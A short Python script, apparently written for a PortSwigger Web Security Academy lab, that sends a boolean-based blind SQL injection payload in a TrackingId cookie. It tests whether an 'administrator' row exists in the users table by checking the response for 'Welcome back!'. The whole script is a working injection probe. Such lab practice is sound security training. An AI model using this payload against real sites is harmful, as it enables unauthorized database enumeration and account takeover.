import requests

url = 'https://0a0f00ac04165006809a7be000c30091.web-security-academy.net/'

trackingid = 'dWxzAiSNTczU3ZRV'
payload = f'''{trackingid}' AND (SELECT 'a' FROM users WHERE username='administrator')='a'''

cookie = {
	'session': 'xTeKJKOPDMSYJ0ziiWhYSXaZxAYXcG0y',
	'TrackingId': payload
}
r = requests.get(url, cookies=cookie)
if 'Welcome back!' in r.text:
	print('True')
else:
	print('False')